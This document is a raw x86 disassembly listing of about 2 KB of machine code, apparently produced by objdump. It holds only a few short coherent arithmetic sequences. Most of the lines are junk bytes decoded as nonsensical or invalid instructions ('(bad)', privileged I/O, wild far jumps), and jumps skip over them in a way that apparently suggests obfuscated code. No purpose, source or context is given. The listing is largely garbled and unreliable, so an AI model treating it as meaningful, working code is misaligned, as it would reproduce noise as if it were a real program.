  40ee01:	xchg   DWORD PTR [ebp-0x26],eax
  40ee04:	fadd   QWORD PTR [ecx+0x14e2ac2e]
  40ee0a:	and    BYTE PTR [ebx+0x6c],ch
  40ee0d:	push   esp
  40ee0e:	cli    
  40ee0f:	xchg   ebp,eax
  40ee10:	adc    edi,DWORD PTR [esi+0x14fc4111]
  40ee16:	aas    
  40ee17:	ins    BYTE PTR es:[edi],dx
  40ee18:	add    BYTE PTR [ecx+0x42ae8375],bh
  40ee1e:	lahf   
  40ee1f:	jmp    0x4387:0x6caa4640
  40ee26:	jmp    0x40edfe
  40ee28:	jmp    0xc40a12d6
  40ee2d:	ins    DWORD PTR es:[edi],dx
  40ee2e:	add    BYTE PTR [esi-0x2500dd2e],dh
  40ee34:	cld    
  40ee35:	and    al,0xc1
  40ee37:	jg     0x40ee70
  40ee39:	aas    
  40ee3a:	ja     0x40ede1
  40ee3c:	xor    BYTE PTR [esp+esi*8],bh
  40ee3f:	pop    esi
  40ee40:	lods   al,BYTE PTR ds:[esi]
  40ee41:	popf   
  40ee42:	mov    bl,0xf0
  40ee44:	jle    0x40ee0f
  40ee46:	xor    DWORD PTR [ebp-0x1],eax
  40ee49:	loop   0x40edcb
  40ee4b:	xchg   edi,eax
  40ee4c:	stos   DWORD PTR es:[edi],eax
  40ee4d:	sbb    dl,BYTE PTR [edi]
  40ee4f:	mov    WORD PTR [ecx],?
  40ee51:	test   esi,0xb78d4aa1
  40ee57:	xor    eax,0x415f28b1
  40ee5c:	pop    es
  40ee5d:	mov    cl,0x7a
  40ee5f:	fs cmc 
  40ee61:	push   0x76439581
  40ee66:	jmp    0x7873ca20
  40ee6b:	mov    esp,0x8dfb8f5f
  40ee70:	sbb    eax,0x40f18381
  40ee75:	mov    ebx,0x4543
  40ee7a:	push   edx
  40ee7b:	xor    eax,0x1204
  40ee80:	and    ecx,ebx
  40ee82:	and    eax,0x3217
  40ee87:	push   ecx
  40ee88:	push   eax
  40ee89:	call   0x421ba4
  40ee8e:	mov    eax,ds:0x4225b8
  40ee93:	mov    eax,ds:0x4225bc
  40ee98:	shr    edx,0x1e
  40ee9b:	shr    eax,0x1e
  40ee9e:	xor    ecx,ecx
  40eea0:	mov    esi,edx
  40eea2:	and    esi,eax
  40eea4:	mov    eax,DWORD PTR [ebp-0x10]
  40eea7:	xor    edi,edi
  40eea9:	and    edi,ecx
  40eeab:	mov    ecx,DWORD PTR [ebp-0xc]
  40eeae:	mov    edx,DWORD PTR [ebp-0x18]
  40eeb1:	xor    ecx,0x40
  40eeb4:	and    ecx,ebx
  40eeb6:	mov    ebx,DWORD PTR [ebp-0x14]
  40eeb9:	push   ebx
  40eeba:	push   edx
  40eebb:	xor    eax,0x1204
  40eec0:	and    eax,0x3217
  40eec5:	push   ecx
  40eec6:	push   eax
  40eec7:	call   0x421ba4
  40eecc:	mov    ecx,DWORD PTR ds:0x4225b8
  40eed2:	mov    ebx,DWORD PTR ds:0x4225bc
  40eed8:	and    eax,ecx
  40eeda:	and    edx,ebx
  40eedc:	xor    eax,0x6201
  40eee1:	xor    edx,0x91
  40eee7:	shld   edx,eax,0x2
  40eeeb:	shl    eax,0x2
  40eeee:	or     eax,esi
  40eef0:	or     edx,edi
  40eef2:	xor    eax,0xcb89b676
  40eef7:	xor    edx,0x9d2b8af8
  40eefd:	mov    DWORD PTR [ebp-0x18],eax
  40ef00:	mov    DWORD PTR [ebp-0x14],edx
  40ef03:	mov    eax,ds:0x4225b0
  40ef08:	mov    ecx,DWORD PTR ds:0x4225b4
  40ef0e:	mov    edx,0x2615
  40ef13:	sub    edx,eax
  40ef15:	mov    esi,0xffffee5e
  40ef1a:	sbb    esi,ecx
  40ef1c:	and    edx,0x4002
  40ef22:	and    esi,0x2004
  40ef28:	mov    eax,edx
  40ef2a:	mov    edx,DWORD PTR [ebp-0x18]
  40ef2d:	mov    ecx,esi
  40ef2f:	mov    esi,DWORD PTR [ebp-0x14]
  40ef32:	or     eax,0x71
  40ef35:	or     ecx,0x4090
  40ef3b:	add    edx,eax
  40ef3d:	mov    eax,DWORD PTR [ebp+0xc]
  40ef40:	adc    esi,ecx
  40ef42:	add    edx,0xffffbf8f
  40ef48:	adc    esi,0xffff9f6f
  40ef4e:	mov    DWORD PTR [eax],edx
  40ef50:	mov    DWORD PTR [eax+0x4],esi
  40ef53:	mov    eax,DWORD PTR [ebp-0x20]
  40ef56:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ef59:	jmp    0x40f2d7
  40ef5e:	loop   0x40efde
  40ef60:	xor    al,BYTE PTR [esi-0x60884949]
  40ef66:	js     0x40efe7
  40ef68:	jae    0x40ef6f
  40ef6a:	mov    dh,0xe3
  40ef6c:	jg     0x40efa9
  40ef6e:	rcl    DWORD PTR ds:0xc578bbbb,0xbb
  40ef75:	mov    ebx,0x9d65168
  40ef7a:	jmp    0x8e3863a2
  40ef7f:	inc    ebx
  40ef80:	fucomi st,st(2)
  40ef82:	dec    ecx
  40ef83:	stc    
  40ef84:	cmp    eax,0xd87fdb3d
  40ef89:	gs hlt 
  40ef8b:	aaa    
  40ef8c:	xchg   ebx,eax
  40ef8d:	xor    BYTE PTR [edi+0x75a77dcf],al
  40ef93:	mov    BYTE PTR [esp+ebp*4-0x66],dh
  40ef97:	je     0x40efd9
  40ef99:	nop
  40ef9a:	bnd call 0x2e732017
  40efa0:	jg     0x40efc6
  40efa2:	(bad)  [ecx+eax*4-0x50]
  40efa6:	pop    esp
  40efa7:	int    0xf5
  40efa9:	adc    al,0x35
  40efab:	fwait
  40efac:	mov    edx,0x9678c8df
  40efb1:	sub    esi,DWORD PTR [ecx-0x653a6fc0]
  40efb7:	and    bh,dl
  40efb9:	iret   
  40efba:	jecxz  0x40f007
  40efbc:	mov    cs,WORD PTR [edi+esi*2+0x4570bb2f]
  40efc3:	cmp    bh,0x44
  40efc6:	sub    dl,BYTE PTR [eax]
  40efc8:	add    al,0xe3
  40efca:	sbb    eax,0xeb1d9762
  40efcf:	cmp    ecx,DWORD PTR [eax+0x20]
  40efd2:	aam    0x71
  40efd4:	pop    esi
  40efd5:	pop    esi
  40efd6:	lahf   
  40efd7:	out    0xe7,al
  40efd9:	xchg   DWORD PTR [ebx+edi*2],esi
  40efdc:	imul   ebx,DWORD PTR [ecx],0x52
  40efdf:	cwde   
  40efe0:	xchg   edi,eax
  40efe1:	mov    esi,0x987971f1
  40efe6:	cmp    DWORD PTR [edi+0x3d],esi
  40efe9:	dec    ebp
  40efea:	scas   al,BYTE PTR es:[edi]
  40efeb:	push   edi
  40efec:	add    dh,BYTE PTR [edx+0x9]
  40efef:	add    al,0x80
  40eff1:	les    ebx,FWORD PTR [edx]
  40eff3:	mov    bl,BYTE PTR [edx+0x3d]
  40eff6:	or     ch,dl
  40eff8:	inc    esi
  40eff9:	in     al,dx
  40effa:	push   esp
  40effb:	les    ebx,FWORD PTR [ebx]
  40effd:	ror    bl,cl
  40efff:	sar    DWORD PTR [esi+eax*1-0x3e],cl
  40f003:	add    esi,DWORD PTR [ecx+0x171b76a6]
  40f009:	ins    BYTE PTR es:[edi],dx
  40f00a:	dec    ebx
  40f00b:	call   FWORD PTR [edi]
  40f00d:	and    al,ah
  40f00f:	xchg   ch,al
  40f011:	xchg   edi,eax
  40f012:	popa   
  40f013:	pop    ecx
  40f014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f015:	mov    dl,0xb6
  40f017:	cmp    BYTE PTR [eax+0x51f9f46d],0xc1
  40f01e:	clc    
  40f01f:	mov    ebx,0x58194ee1
  40f024:	add    ecx,edi
  40f026:	jecxz  0x40effc
  40f028:	or     bh,BYTE PTR [edi+eax*8+0x8e3655b]
  40f02f:	push   ebp
  40f030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f031:	pusha  
  40f032:	shr    BYTE PTR [ecx+0x48],cl
  40f035:	cld    
  40f036:	fmul   QWORD PTR [ebx-0x545271e8]
  40f03c:	sub    al,bl
  40f03e:	pop    ebp
  40f03f:	sub    al,0xb9
  40f041:	sbb    eax,0xb7085000
  40f046:	enter  0x9f60,0xa2
  40f04a:	adc    ecx,DWORD PTR [eax]
  40f04c:	cmp    ch,BYTE PTR [edi-0x43]
  40f04f:	pop    ecx
  40f050:	pop    ss
  40f051:	mov    DWORD PTR [ecx-0x47798e4d],esp
  40f057:	out    0x31,eax
  40f059:	dec    ecx
  40f05a:	inc    edx
  40f05b:	outs   dx,BYTE PTR ds:[esi]
  40f05c:	sbb    al,0x91
  40f05e:	in     eax,0x38
  40f060:	int3   
  40f061:	sbb    al,0xa8
  40f063:	fst    DWORD PTR [ecx-0x72b749d0]
  40f069:	cwde   
  40f06a:	(bad)  
  40f06b:	stc    
  40f06c:	pop    ds
  40f06d:	pop    eax
  40f06e:	pop    edi
  40f06f:	xchg   ecx,eax
  40f070:	imul   eax,ebx,0xcdaddb76
  40f076:	jbe    0x40f020
  40f078:	inc    esi
  40f079:	cmp    al,al
  40f07b:	add    DWORD PTR [ebx-0x2d],edi
  40f07e:	es aam 0x84
  40f081:	cmc    
  40f082:	sbb    ebx,DWORD PTR [eax+0x67]
  40f085:	xchg   esi,eax
  40f086:	xchg   ecx,eax
  40f087:	test   DWORD PTR [edx-0x7649d295],0xe26239f
  40f091:	or     cl,BYTE PTR [ebp+0x84ef0c4]
  40f097:	jbe    0x40f06d
  40f099:	sub    ebx,DWORD PTR [ecx]
  40f09b:	pop    edi
  40f09c:	jb     0x40f118
  40f09e:	inc    edx
  40f09f:	push   cs
  40f0a0:	inc    edx
  40f0a1:	pop    ss
  40f0a2:	call   0xc0dd:0x85934562
  40f0a9:	fwait
  40f0aa:	pushf  
  40f0ab:	test   ecx,esp
  40f0ad:	push   es
  40f0ae:	or     DWORD PTR [edi+esi*1],0xa4c5e91a
  40f0b5:	cdq    
  40f0b6:	sbb    eax,0x5012af3e
  40f0bb:	fcomp  DWORD PTR [edx+eiz*4-0x3fd6826]
  40f0c2:	mov    edx,0x4a0d0cc2
  40f0c7:	jns    0x40f07f
  40f0c9:	pop    eax
  40f0ca:	pop    esi
  40f0cb:	push   ebx
  40f0cc:	dec    ecx
  40f0cd:	ret    0x75f7
  40f0d0:	scas   al,BYTE PTR es:[edi]
  40f0d1:	inc    eax
  40f0d2:	sbb    bh,ch
  40f0d4:	inc    ecx
  40f0d5:	(bad)
  40f0d8:	push   esp
  40f0d9:	cmp    al,0x61
  40f0db:	add    eax,0x1c2d04d8
  40f0e0:	xor    ah,BYTE PTR [ecx]
  40f0e2:	dec    ecx
  40f0e3:	enter  0xe12c,0x92
  40f0e7:	or     eax,0xc694a6c0
  40f0ec:	ja     0x40f0be
  40f0ee:	inc    eax
  40f0ef:	cld    
  40f0f0:	adc    DWORD PTR [edi-0x11],eax
  40f0f3:	jl     0x40f15e
  40f0f5:	dec    edi
  40f0f6:	dec    ebx
  40f0f7:	repz data16 jl 0x40f0ed
  40f0fb:	mov    BYTE PTR [eax+0x233111af],0xb6
  40f102:	imul   esi,DWORD PTR [esi-0x6de4048b],0xffffffc4
  40f109:	loopne 0x40f15f
  40f10b:	and    al,0x19
  40f10d:	sahf   
  40f10e:	test   al,0x34
  40f110:	cmp    ah,ch
  40f112:	fadd   st,st(7)
  40f114:	and    BYTE PTR [edx+0x4c660574],ah
  40f11a:	(bad)  
  40f11b:	in     eax,0xe0
  40f11d:	lahf   
  40f11e:	and    DWORD PTR [ebp-0x3cf22d37],ecx
  40f124:	popa   
  40f125:	inc    ebp
  40f126:	pop    eax
  40f127:	jg     0x40f163
  40f129:	cli    
  40f12a:	dec    esp
  40f12b:	out    dx,al
  40f12c:	ss cmc 
  40f12e:	push   ss
  40f12f:	sti    
  40f130:	aad    0x80
  40f132:	daa    
  40f133:	leave  
  40f134:	fwait
  40f135:	lds    esi,FWORD PTR [esi-0x75]
  40f138:	idiv   DWORD PTR [esi+ebp*1]
  40f13b:	or     eax,0xe4eb63a9
  40f140:	jmp    0xfcf162a3
  40f145:	fld    DWORD PTR [eax]
  40f147:	js     0x40f154
  40f149:	enter  0x372a,0xec
  40f14d:	daa    
  40f14e:	not    BYTE PTR [ebp-0xcf6255d]
  40f154:	sbb    esp,ebx
  40f156:	xchg   DWORD PTR [esi-0x76],esp
  40f159:	mov    eax,ds:0xb8189055
  40f15e:	ss out dx,eax
  40f160:	fdiv   QWORD PTR [esi+eax*1-0x70]
  40f164:	dec    ebp
  40f165:	sbb    DWORD PTR [edi],0x229ab23d
  40f16b:	addr16 xor al,cl
  40f16e:	mov    ebx,0x85865d79
  40f173:	pop    ecx
  40f174:	mov    edi,0x34288d04
  40f179:	out    0x68,al
  40f17b:	not    DWORD PTR [ebx+0x5a]
  40f17e:	cli    
  40f17f:	dec    eax
  40f180:	jae    0x40f169
  40f182:	not    DWORD PTR [ebp-0x3d]
  40f185:	and    esp,DWORD PTR [esi+eax*8+0x29]
  40f189:	dec    ebx
  40f18a:	pop    esi
  40f18b:	sub    al,0x7c
  40f18d:	pop    es
  40f18e:	lock pop ecx
  40f190:	retf   
  40f191:	retf   
  40f192:	cmp    edx,DWORD PTR ds:0x2a793c10
  40f198:	xchg   esp,eax
  40f199:	push   edi
  40f19a:	adc    ch,al
  40f19c:	iret   
  40f19d:	xchg   cl,cl
  40f19f:	les    ebp,FWORD PTR [edx-0x43c257d2]
  40f1a5:	test   DWORD PTR [ebp-0x35a47810],0xa80f2467
  40f1af:	dec    eax
  40f1b0:	mov    edi,DWORD PTR fs:[ecx+0x42]
  40f1b4:	out    dx,eax
  40f1b5:	lods   al,BYTE PTR ds:[esi]
  40f1b6:	dec    edi
  40f1b7:	xchg   edx,eax
  40f1b8:	loop   0x40f228
  40f1ba:	retf   
  40f1bb:	mov    edi,0x925b354e
  40f1c0:	sub    ebx,DWORD PTR [eax+0x7bf39e40]
  40f1c6:	add    eax,0xbbef216d
  40f1cb:	or     BYTE PTR [edi],dl
  40f1cd:	out    dx,eax
  40f1ce:	mul    dl
  40f1d0:	pop    esi
  40f1d1:	or     DWORD PTR [edi+eiz*8-0xc],eax
  40f1d5:	dec    dh
  40f1d7:	fisubr WORD PTR [edx+0x3500dee1]
  40f1dd:	(bad)  
  40f1de:	adc    al,0xce
  40f1e0:	std    
  40f1e1:	inc    esp
  40f1e2:	loop   0x40f181
  40f1e4:	int    0x44
  40f1e6:	popf   
  40f1e7:	or     BYTE PTR ds:0x2cc2df47,0x39
  40f1ee:	ret    
  40f1ef:	mov    ah,0xbf
  40f1f1:	fimul  WORD PTR [ebx-0x22af9ad8]
  40f1f7:	inc    ecx
  40f1f8:	xchg   edi,eax
  40f1f9:	mov    ebp,0x11a8e046
  40f1fe:	xchg   DWORD PTR [ebp+0x24],esi
  40f201:	add    al,0x41
  40f203:	iret   
  40f204:	loope  0x40f235
  40f206:	sbb    dl,dh
  40f208:	iret   
  40f209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f20a:	dec    edx
  40f20b:	sub    DWORD PTR [edi+ebp*1-0x3],0xa
  40f210:	les    ebx,FWORD PTR ds:0x76566953
  40f216:	sbb    ah,BYTE PTR [ebx]
  40f218:	arpl   WORD PTR [esi],bx
  40f21a:	imul   edx,DWORD PTR [esi],0x8c855dbb
  40f220:	push   es
  40f221:	test   dh,dh
  40f223:	hlt    
  40f224:	push   0x45c44ecc
  40f229:	mov    ebx,0x33c6a9c0
  40f22e:	mov    ds:0xa6be8508,al
  40f233:	mov    bl,0x7a
  40f235:	lds    esp,FWORD PTR [eax]
  40f237:	pop    esi
  40f238:	pop    ebp
  40f239:	rcl    ch,0xe2
  40f23c:	cmp    BYTE PTR [edi+0x5a],cl
  40f23f:	fdiv   DWORD PTR [esi+0x4a200fc]
  40f245:	loope  0x40f221
  40f247:	mov    eax,ds:0x9582aee9
  40f24c:	scas   eax,DWORD PTR es:[edi]
  40f24d:	mov    dl,0x26
  40f24f:	(bad)  
  40f251:	push   ds
  40f252:	sar    BYTE PTR [esi+0x406a1bcb],1
  40f258:	lds    ecx,FWORD PTR ds:0x233389ca
  40f25e:	xlat   BYTE PTR ds:[ebx]
  40f25f:	stos   DWORD PTR es:[edi],eax
  40f260:	adc    BYTE PTR [edi+eax*1+0x2b],bh
  40f264:	test   al,0xd1
  40f266:	imul   ebx,DWORD PTR [ecx-0x4570c2b2],0x2c
  40f26d:	or     ecx,0x67
  40f270:	mov    ss,WORD PTR ds:0xa892b4d6
  40f276:	mov    al,0x48
  40f278:	xchg   ebp,eax
  40f27a:	xchg   ebx,eax
  40f27b:	addr16 or dl,bl
  40f27e:	mov    dl,0x7e
  40f280:	ret    
  40f281:	inc    cx
  40f283:	mov    bl,0xa2
  40f285:	addr16 (bad) 
  40f287:	xchg   edx,eax
  40f288:	das    
  40f289:	sbb    eax,0x4df30b49
  40f28e:	test   esi,0xaa033dea
  40f294:	ins    DWORD PTR es:[edi],dx
  40f295:	jmp    0x40f26e
  40f297:	mov    DWORD PTR [edx],ecx
  40f299:	gs (bad) 
  40f29b:	adc    ebx,ecx
  40f29d:	mov    dl,0x50
  40f29f:	inc    ebp
  40f2a0:	test   DWORD PTR [ebx],ecx
  40f2a2:	iret   
  40f2a3:	sbb    esi,eax
  40f2a5:	xchg   edi,eax
  40f2a6:	hlt    
  40f2a7:	rcr    DWORD PTR [edx+0x33cb1aa9],1
  40f2ad:	scas   al,BYTE PTR es:[edi]
  40f2ae:	rol    DWORD PTR [ecx-0x46dfae8f],0xf8
  40f2b5:	mov    edi,0x4c06ba33
  40f2ba:	dec    ebx
  40f2bb:	lock (bad) 
  40f2bd:	les    edx,FWORD PTR [edi-0x3]
  40f2c0:	or     DWORD PTR [ebx-0x53212dd4],eax
  40f2c6:	imul   edx
  40f2c8:	aad    0x65
  40f2ca:	je     0x40f2d7
  40f2cc:	in     al,0xd7
  40f2ce:	test   esp,esp
  40f2d0:	lods   al,BYTE PTR ds:[esi]
  40f2d1:	push   esp
  40f2d2:	scas   al,BYTE PTR es:[edi]
  40f2d3:	mov    cl,0x0
  40f2d5:	in     al,dx
  40f2d6:	std    
  40f2d7:	mov    ecx,DWORD PTR [ebp-0x28]
  40f2da:	mov    edx,DWORD PTR [ebp-0x24]
  40f2dd:	and    eax,ecx
  40f2df:	push   0xfffffffe
  40f2e1:	jmp    0x40f65f
  40f2e6:	(bad)
  40f2e9:	mov    edi,0xd52d3d33
  40f2ee:	or     al,0xc8
  40f2f0:	mov    bh,0x2f
  40f2f2:	test   BYTE PTR [esi],dh
  40f2f4:	mov    bl,0x2f
  40f2f6:	jbe    0x40f30f
  40f2f8:	mov    ebx,0xbbc578bb
  40f2fd:	mov    ebx,0x58a780fa
  40f302:	dec    ecx
  40f303:	dec    edx
  40f304:	jp     0x40f307
  40f306:	fistp  WORD PTR [ebp+esi*8+0x605c34ed]
  40f30e:	mov    esp,0x8f474173
  40f313:	mov    eax,0x4cebcf0
  40f318:	jmp    0xa3adbd61
  40f31d:	imul   BYTE PTR [ebx]
  40f31f:	sar    bl,0xad
  40f322:	jae    0x40f36c
  40f324:	test   esp,0x78cb5915
  40f32a:	hlt    
  40f32b:	jmp    0xbc5cb05e
  40f330:	or     edx,DWORD PTR [edi+0x14]
  40f333:	(bad)  
  40f334:	xor    eax,0xa8e5a831
  40f339:	jmp    0x40f32a
  40f33b:	lahf   
  40f33c:	clc    
  40f33d:	and    ebx,eax
  40f33f:	ins    BYTE PTR es:[edi],dx
  40f340:	ret    0x6325
  40f343:	test   BYTE PTR [esi-0x3c],ch
  40f346:	mov    al,0xc8
  40f348:	adc    al,0x5a
  40f34a:	addr16 pop ebx
  40f34c:	or     bl,BYTE PTR [ecx-0x456db526]
  40f352:	xor    ch,BYTE PTR [ebx-0x47]
  40f355:	lods   al,BYTE PTR ds:[esi]
  40f356:	push   ss
  40f357:	dec    ebp
  40f358:	leave  
  40f359:	jno    0x40f3ba
  40f35b:	xor    eax,0xf82c3a5d
  40f360:	mov    ecx,0x8739e861
  40f365:	cdq    
  40f366:	inc    ebp
  40f367:	push   edi
  40f368:	call   0x1453:0xf98550ef
  40f36f:	dec    esi
  40f370:	mov    bh,0xe5
  40f372:	xchg   DWORD PTR [ebx+esi*8],eax
  40f375:	fs dec edi
  40f377:	arpl   WORD PTR [eax+0x2b7fc35e],bx
  40f37d:	add    DWORD PTR [ecx-0xb],ebp
  40f380:	pusha  
  40f381:	(bad)  
  40f383:	imul   eax,DWORD PTR [edi-0xaef7067],0xee5721fa
  40f38d:	sub    al,0x8a
  40f38f:	(bad)  
  40f390:	dec    eax
  40f391:	test   al,0xef
  40f393:	cs xor dl,ch
  40f396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f397:	imul   ebx,edx,0xffffffaa
  40f39a:	sahf   
  40f39b:	mov    esp,DWORD PTR [ecx-0x6d]
  40f39e:	stos   BYTE PTR es:[edi],al
  40f39f:	jae    0x40f32f
  40f3a1:	jno    0x40f3d4
  40f3a3:	fiadd  DWORD PTR [edx-0x48]
  40f3a6:	push   ds
  40f3a7:	adc    esi,DWORD PTR [eax-0x7670c257]
  40f3ad:	out    dx,eax
  40f3ae:	nop
  40f3af:	rcr    DWORD PTR [esi],0xb5
  40f3b2:	dec    ecx
  40f3b3:	xchg   ecx,eax
  40f3b4:	adc    BYTE PTR [esi+0x293d361],ah
  40f3ba:	xchg   esp,eax
  40f3bb:	push   edi
  40f3bc:	cdq    
  40f3bd:	fstp   DWORD PTR [esi+ebx*1-0x6]
  40f3c1:	adc    eax,0xab09a404
  40f3c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3c7:	outs   dx,BYTE PTR ds:[esi]
  40f3c8:	jae    0x40f3a0
  40f3ca:	add    esi,DWORD PTR [eax+0x3e237af9]
  40f3d0:	(bad)  
  40f3d1:	shl    BYTE PTR ss:[ebx+0x1a],cl
  40f3d5:	push   esi
  40f3d6:	call   0x2005:0xf88331b3
  40f3dd:	inc    ebx
  40f3de:	rcr    BYTE PTR [edi+0x2a],cl
  40f3e1:	out    dx,al
  40f3e2:	(bad)  
  40f3e3:	loope  0x40f3a8
  40f3e5:	out    dx,al
  40f3e6:	enter  0xb37b,0xbe
  40f3ea:	pop    esp
  40f3eb:	fwait
  40f3ec:	push   ds
  40f3ed:	pop    esi
  40f3ee:	mul    BYTE PTR [ecx+ebp*1-0x7da06e58]
  40f3f5:	jge    0x40f408
  40f3f7:	outs   dx,DWORD PTR ds:[esi]
  40f3f8:	mov    ds:0xa4090624,eax
  40f3fd:	fiadd  DWORD PTR [ebx-0x3061dc6]
  40f403:	or     al,0xf9
  40f405:	mov    DWORD PTR [eax-0x7b6237eb],edx
  40f40b:	xor    dh,BYTE PTR [edx+0x65]
  40f40e:	cmc    
  40f40f:	add    al,0xbf
  40f411:	inc    esi
  40f412:	cdq    
  40f413:	(bad)  
  40f414:	push   ss
  40f415:	shl    esi,cl
  40f417:	addr16 data16 inc ah
  40f41b:	xchg   bl,bh
  40f41d:	mov    al,0xb0
  40f41f:	sbb    al,0xd0
  40f421:	add    BYTE PTR [ecx-0x7b230e28],bl
  40f427:	sub    BYTE PTR [edi+0x5],ch
  40f42a:	stc    
  40f42b:	dec    ebx
  40f42c:	sub    edi,DWORD PTR [ebp+0x9]
  40f42f:	dec    eax
  40f430:	xchg   BYTE PTR [edx],dh
  40f432:	mov    esi,0x88bf1bb4
  40f437:	icebp  
  40f438:	in     al,0xa1
  40f43a:	out    0x0,al
  40f43c:	xor    eax,0xaebe66d2
  40f441:	xor    eax,0xb4f4bb36
  40f446:	mov    eax,0x7a72a567
  40f44b:	mov    gs,WORD PTR [edi+0x3c]
  40f44e:	ret    
  40f44f:	enter  0x8d9f,0xfa
  40f453:	adc    ch,ch
  40f455:	into   
  40f456:	cs leave 
  40f458:	out    0xe7,al
  40f45a:	and    dl,BYTE PTR [ebp-0x1b0a71b0]
  40f460:	push   eax
  40f461:	ret    0x7c20
  40f464:	xchg   edx,eax
  40f465:	mov    BYTE PTR [eax+0xb],dh
  40f468:	add    dh,BYTE PTR [ebx]
  40f46a:	mov    BYTE PTR [ecx+0x79],bl
  40f46d:	out    0xe3,al
  40f46f:	into   
  40f470:	sahf   
  40f471:	addr16 mov esp,eax
  40f474:	push   ds
  40f475:	stos   DWORD PTR es:[edi],eax
  40f476:	push   ebx
  40f477:	dec    ebp
  40f478:	inc    eax
  40f479:	js     0x40f485
  40f47b:	mov    esi,DWORD PTR [ebp-0x72]
  40f47e:	and    ah,BYTE PTR [eax-0x35764067]
  40f484:	jae    0x40f435
  40f486:	test   eax,0x24856751
  40f48b:	mov    eax,ds:0x41f89a80
  40f490:	(bad)  
  40f491:	popf   
  40f492:	adc    cl,BYTE PTR [edx+0x5e]
  40f495:	xchg   edi,eax
  40f496:	adc    al,0xa6
  40f498:	cmp    al,0xe4
  40f49a:	pop    ss
  40f49b:	aas    
  40f49c:	clc    
  40f49d:	icebp  
  40f49e:	lahf   
  40f49f:	add    bh,BYTE PTR [edx+0xa]
  40f4a2:	sbb    esi,0xda7a899d
  40f4a8:	push   ebx
  40f4a9:	mul    BYTE PTR [eax-0x1e]
  40f4ac:	out    dx,eax
  40f4ad:	stc    
  40f4ae:	stc    
  40f4af:	xor    eax,0x8bc4503c
  40f4b4:	add    dh,BYTE PTR [ecx]
  40f4b6:	add    edx,DWORD PTR [ecx]
  40f4b8:	je     0x40f4a8
  40f4ba:	les    ebx,FWORD PTR [edi-0x11ae6279]
  40f4c0:	xchg   edx,eax
  40f4c1:	fwait
  40f4c2:	inc    ebx
  40f4c3:	or     al,0x30
  40f4c5:	repz push ds
  40f4c7:	fcom   QWORD PTR [ecx]
  40f4c9:	in     al,0x11
  40f4cb:	mov    edx,eax
  40f4cd:	test   ch,ch
  40f4cf:	nop
  40f4d0:	sti    
  40f4d1:	sbb    DWORD PTR [esi-0x49126d60],eax
  40f4d7:	sbb    al,0xc0
  40f4d9:	scas   eax,DWORD PTR es:[edi]
  40f4da:	pop    edx
  40f4db:	jb     0x40f49f
  40f4dd:	xor    ecx,DWORD PTR [esi-0x4e99b8ee]
  40f4e3:	rcl    al,cl
  40f4e5:	xchg   ecx,eax
  40f4e6:	mov    WORD PTR [esi],ss
  40f4e8:	hlt    
  40f4e9:	mov    bh,0x35
  40f4eb:	icebp  
  40f4ec:	pop    ds
  40f4ed:	jmp    FWORD PTR [edi+0x484a9214]
  40f4f3:	ins    BYTE PTR es:[edi],dx
  40f4f4:	push   es
  40f4f5:	mov    ebx,0xc02f9894
  40f4fa:	inc    ebp
  40f4fb:	ins    BYTE PTR es:[edi],dx
  40f4fc:	add    esp,ebx
  40f4fe:	mov    al,0x34
  40f500:	adc    eax,0x8c5ecf59
  40f505:	cs mov ebx,0x62c3bb6c
  40f50b:	xchg   edi,eax
  40f50c:	ins    BYTE PTR es:[edi],dx
  40f50d:	and    ebx,DWORD PTR [edi+eiz*8]
  40f510:	jae    0x40f56e
  40f512:	ins    BYTE PTR es:[edi],dx
  40f513:	jp     0x40f541
  40f515:	test   DWORD PTR [edx],ebp
  40f517:	mov    ebx,0xe4cd0caf
  40f51c:	pushf  
  40f51d:	pop    ecx
  40f51e:	push   0xc13b7d45
  40f523:	cs retf 
  40f525:	loopne 0x40f599
  40f527:	xor    DWORD PTR [ebp+0x7b],ebx
  40f52a:	or     al,0xd
  40f52c:	out    dx,al
  40f52d:	in     eax,0xfa
  40f52f:	xor    DWORD PTR [esi+0x6e7fd6db],ebp
  40f535:	cld    
  40f536:	aam    0xb1
  40f538:	(bad)  
  40f539:	not    DWORD PTR [eax+esi*2]
  40f53c:	fst    DWORD PTR [edi+0x5a]
  40f53f:	xor    DWORD PTR [ebp+ebx*8-0x3d],edx
  40f543:	pop    ss
  40f544:	mov    edx,0xffb03c68
  40f549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f54a:	pop    ebx
  40f54b:	push   fs
  40f54d:	pushf  
  40f54e:	add    ah,ch
  40f550:	lods   eax,DWORD PTR ds:[esi]
  40f551:	cmc    
  40f552:	gs adc dl,al
  40f555:	sub    bl,0xb3
  40f558:	ins    BYTE PTR es:[edi],dx
  40f559:	jo     0x40f5d3
  40f55b:	js     0x40f5d1
  40f55d:	inc    eax
  40f55e:	bound  ebx,QWORD PTR [eax-0x594e08ca]
  40f564:	jl     0x40f5b9
  40f566:	add    eax,ebx
  40f568:	mov    fs,WORD PTR [edi+0x21]
  40f56b:	ret    0x379c
  40f56e:	and    BYTE PTR [esp+0x0],ah
  40f572:	clc    
  40f573:	xor    eax,0x95856ff4
  40f578:	loopne 0x40f55f
  40f57a:	push   es
  40f57b:	fwait
  40f57c:	arpl   WORD PTR [esi+0x46dc2b67],ax
  40f582:	dec    eax
  40f583:	push   edi
  40f584:	jb     0x40f53b
  40f586:	icebp  
  40f587:	sub    DWORD PTR [edx],ecx
  40f589:	push   es
  40f58a:	jns    0x40f5d2
  40f58c:	mov    dh,0x1a
  40f58e:	jne    0x40f5d0
  40f590:	xchg   esi,eax
  40f591:	push   ebx
  40f592:	push   ds
  40f593:	es jno 0x40f60d
  40f596:	push   edx
  40f597:	stc    
  40f598:	dec    esi
  40f599:	ss dec ebp
  40f59b:	lods   eax,DWORD PTR ds:[esi]
  40f59c:	xor    eax,0x5e260a46
  40f5a1:	xchg   ebx,eax
  40f5a2:	pushf  
  40f5a3:	fchs   
  40f5a5:	adc    esp,ebp
  40f5a7:	push   ss
  40f5a8:	addr16 in eax,0xb7
  40f5ab:	lods   eax,DWORD PTR ds:[esi]
  40f5ac:	(bad)  
  40f5ad:	jmp    0xa59b:0xdd8c3faa
  40f5b4:	pop    eax
  40f5b5:	sti    
  40f5b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
